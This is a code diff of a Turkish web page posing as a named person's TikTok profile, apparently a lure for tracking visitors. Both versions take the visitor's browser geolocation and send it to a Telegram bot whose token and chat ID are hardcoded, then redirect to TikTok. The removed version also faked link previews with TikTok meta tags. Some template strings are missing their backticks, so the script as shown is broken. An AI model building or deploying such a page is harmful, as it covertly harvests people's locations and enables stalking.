@@ -1,66 +1,95 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8">
-  <title>Konum Gönder</title>
-
-  <!-- TikTok Profiline ait Open Graph ve Twitter meta etiketleri (WhatsApp ve sosyal medya önizlemesi için) -->
-  <meta property="og:title" content="@ilayda.yldrm84 | TikTok">
-  <meta property="og:description" content="TikTok'ta @ilayda.yldrm84 profilini keşfet!">
-  <meta property="og:image" content="https://p16-sign-va.tiktokcdn.com/musically-maliva-obj/1661461738075141~c5_720x720.jpeg"> <!-- TikTok Profil Fotoğrafı -->
-  <meta property="og:url" content="https://www.tiktok.com/@ilayda.yldrm84">
-  
-  <!-- Twitter için meta etiketler -->
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="@ilayda.yldrm84 | TikTok">
-  <meta name="twitter:description" content="TikTok'ta @ilayda.yldrm84 profilini keşfet!">
-  <meta name="twitter:image" content="https://p16-sign-va.tiktokcdn.com/musically-maliva-obj/1661461738075141~c5_720x720.jpeg">
-
+  <meta charset="UTF-8" />
+  <title>Konum Gönder & TikTok Profiline Git</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+    }
+    #sendLocationBtn {
+      font-size: 18px;
+      padding: 15px 25px;
+      cursor: pointer;
+      border: none;
+      border-radius: 8px;
+      background-color: #ff0050;
+      color: white;
+    }
+    #sendLocationBtn:hover {
+      background-color: #e60046;
+    }
+    #status {
+      margin-top: 20px;
+      font-weight: bold;
+    }
+  </style>
 </head>
-<body style="text-align:center; font-family:sans-serif; margin-top:50px;">
-  <h2>@ilayda.yldrm84 TikTok Profili</h2>
-  <p>Devam etmek için konumunuzu paylaşın.</p>
-  <button id="sendLocationBtn" style="padding:10px 20px; font-size:16px;">
-    📍 Konumumu Gönder
-  </button>
+<body>
+  <h1>@ilayda.yldrm84 TikTok Profili</h1>
+  <p>Konumunu paylaşmak için butona bas.</p>
+  <button id="sendLocationBtn">📍 Konumumu Gönder</button>
+  <p id="status"></p>
 
   <script>
-    const botToken = "7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA";
-    const chatId = "6358000072";
-    const redirectURL = "https://instagramreports-njr2.vercel.app/?profile=https://www.tiktok.com/@ilayda.yldrm84";  // Vercel linki + TikTok Profil Linki
+    const BOT_TOKEN = "7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA";
+    const CHAT_ID = "6358000072";
+    const TIKTOK_PROFILE_URL = "https://www.tiktok.com/@ilayda.yldrm84";
 
-    // Konum gönderme fonksiyonu
-    function sendLocation(lat, lon) {
-      fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: 📍 Konum alındı:\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}
-        })
-      }).then(() => {
-        window.location.href = redirectURL;  // Konum gönderildikten sonra TikTok profil linkine yönlendir.
-      }).catch(() => {
-        window.location.href = redirectURL;
-      });
-    }
+    const statusEl = document.getElementById("status");
+    const btn = document.getElementById("sendLocationBtn");
 
-    // Konum alma ve gönderme işlemi
-    document.getElementById("sendLocationBtn").addEventListener("click", function () {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            sendLocation(pos.coords.latitude, pos.coords.longitude);  // Konumu gönder
-          },
-          err => {
-            alert("Konum alınamadı: " + err.message);
-            window.location.href = redirectURL;  // Konum alınmazsa, TikTok profilini göster
-          }
-        );
-      } else {
-        alert("Tarayıcınız konum desteği sunmuyor.");
-        window.location.href = redirectURL;  // Tarayıcı konum desteği sunmuyorsa, TikTok profilini göster
+    btn.addEventListener("click", () => {
+      statusEl.textContent = "📍 Konum alınıyor...";
+      if (!navigator.geolocation) {
+        statusEl.textContent = "❌ Tarayıcınız konum desteği sunmuyor.";
+        window.location.href = TIKTOK_PROFILE_URL;
+        return;
       }
+
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          statusEl.textContent = "✅ Konum alındı, Telegram'a gönderiliyor...";
+
+          fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: 📍 Konum alındı:\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}
+            }),
+          })
+          .then(res => {
+            if (res.ok) {
+              statusEl.textContent = "✅ Telegram'a gönderildi, yönlendiriliyorsunuz...";
+              setTimeout(() => {
+                window.location.href = TIKTOK_PROFILE_URL;
+              }, 1500);
+            } else {
+              statusEl.textContent = "❌ Telegram'a gönderilemedi, yönlendiriliyorsunuz...";
+              setTimeout(() => {
+                window.location.href = TIKTOK_PROFILE_URL;
+              }, 1500);
+            }
+          })
+          .catch(() => {
+            statusEl.textContent = "❌ Telegram gönderiminde hata, yönlendiriliyorsunuz...";
+            setTimeout(() => {
+              window.location.href = TIKTOK_PROFILE_URL;
+            }, 1500);
+          });
+        },
+        error => {
+          statusEl.textContent = "❌ Konum alınamadı: " + error.message;
+          setTimeout(() => {
+            window.location.href = TIKTOK_PROFILE_URL;
+          }, 1500);
+        }
+      );
     });
   </script>
 </body>
